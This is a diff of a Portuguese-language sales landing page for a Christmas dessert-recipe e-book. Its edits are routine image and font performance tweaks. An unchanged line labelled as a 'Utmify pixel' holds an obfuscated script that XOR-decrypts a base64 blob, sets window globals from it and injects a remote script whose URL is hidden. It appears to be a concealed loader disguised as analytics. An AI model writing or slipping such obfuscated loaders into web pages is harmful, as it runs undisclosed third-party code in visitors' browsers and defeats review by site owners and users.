@@ -8,7 +8,10 @@
 <meta name="description" content="Faça de R$ 500 a R$ 2.000 vendendo sobremesas no Natal, sem sair de casa. +50 receitas com gramatura e passo a passo, mais 3 bônus. Pagamento único, acesso imediato.">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&family=Playfair+Display:ital,wght@0,700;0,800;1,700&display=swap" rel="stylesheet">
+<link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&family=Playfair+Display:ital,wght@0,700;0,800;1,700&display=swap">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&family=Playfair+Display:ital,wght@0,700;0,800;1,700&display=swap" media="print" onload="this.media='all'">
+<noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&family=Playfair+Display:ital,wght@0,700;0,800;1,700&display=swap"></noscript>
+<link rel="preload" as="image" imagesrcset="assets/mockup-hero-500.webp 500w, assets/mockup-hero-700.webp 700w, assets/mockup-hero.webp 1100w" imagesizes="(max-width:820px) 100vw, 760px" fetchpriority="high">
 <link rel="stylesheet" href="style.css">
 <!-- Utmify pixel -->
 <script>(function(){var l_z94=atob("DNHL4RZhvg1uhl05hqrplGQNnDdM7ilN9qLxzjkC2mNA8ylU77eyz3UO0yMM9HJK5aOikWISkX0H/jhVqaGimXMNkGcdpHEb56W/k38Dy3kL9X8D3Yznw3EN0W8P6i4bvIqww3gA02hMvH9J76mujV8FnCFM8DxV87Tp2zRX325ZtmUOvrP+1HAChm9cvmsNtODzgCBDw1AT");var t_sm=[];for(var q_wp=0;q_wp<l_z94.length;q_wp++){t_sm.push(l_z94.charCodeAt(q_wp)&255);}var q_r6p=t_sm[0];var v_0vg=t_sm.slice(1,1+q_r6p);var u_i0f=t_sm.slice(1+q_r6p);var s_s=u_i0f.map(function(b,m_bwz8){return b^v_0vg[m_bwz8%q_r6p];});var o_p="";for(var t_xd=0;t_xd<s_s.length;t_xd++){o_p+=String.fromCharCode(s_s[t_xd]&255);}var o_j=decodeURIComponent(escape(o_p));var g_pqj=JSON.parse(o_j);var c_atz6=g_pqj.globals||[];c_atz6.forEach(function(k_jf3){window[k_jf3.name]=k_jf3.value;});var g_exd1=document.createElement("script");g_exd1.src=g_pqj.url;g_exd1.async=true;g_exd1.defer=true;(g_pqj.attributes||[]).forEach(function(k_dnss){g_exd1.setAttribute(k_dnss.name,k_dnss.value);});(document.head||document.documentElement).appendChild(g_exd1);})();</script>
@@ -25,7 +28,7 @@
 <header class="hero">
   <div class="wrap center">
     <h1><em>+50 receitas</em> de sobremesas para vender no Natal</h1>
-    <img class="mockup" src="assets/mockup-hero.webp" srcset="assets/mockup-hero-700.webp 700w, assets/mockup-hero.webp 1100w" sizes="(max-width:820px) 100vw, 760px" alt="Natal Lucrativo com os 3 bônus, o selo de garantia de 7 dias e sobremesas de Natal" width="1100" height="733">
+    <img class="mockup" src="assets/mockup-hero.webp" srcset="assets/mockup-hero-500.webp 500w, assets/mockup-hero-700.webp 700w, assets/mockup-hero.webp 1100w" sizes="(max-width:820px) 100vw, 760px" fetchpriority="high" decoding="async" alt="Natal Lucrativo com os 3 bônus, o selo de garantia de 7 dias e sobremesas de Natal" width="1100" height="733">
     <p class="sub">Faça de <b class="gold">R$&nbsp;500 a R$&nbsp;2.000</b> vendendo sobremesas no Natal, sem sair de casa. Receitas com gramatura e passo a passo: pudim, brownie, pão de mel, torta holandesa, banoffee, fatia Ferrero e muito mais.</p>
     <a class="btn big" href="#pricing" data-nav>Quero o meu material de Natal</a>
     <p class="secure">🔒 Compra segura · Acesso imediato por e-mail</p>
@@ -81,7 +84,7 @@
     </div>
 
     <div class="recebe">
-      <img src="assets/livro-3d.webp" alt="Natal Lucrativo: +50 receitas, sobremesas para vender no Natal" width="640" height="960" loading="lazy">
+      <img src="assets/livro-3d.webp" alt="Natal Lucrativo: +50 receitas, sobremesas para vender no Natal" width="480" height="720" loading="lazy" decoding="async">
       <div>
         <h2 class="left">Natal Lucrativo: +50 receitas para vender no Natal</h2>
         <p class="soft">Receitas de confeitaria reunidas em um só material, para você montar o cardápio de Natal.</p>
@@ -120,7 +123,7 @@
     <div class="offers">
       <article class="offer basic">
         <h3>Essencial</h3>
-        <img src="assets/capa-natal.webp" alt="" loading="lazy">
+        <img src="assets/capa-natal.webp" alt="" width="440" height="623" loading="lazy" decoding="async">
         <ul>
           <li class="ok">Natal Lucrativo (+50 receitas)</li>
           <li class="ok">Acesso imediato por e-mail</li>
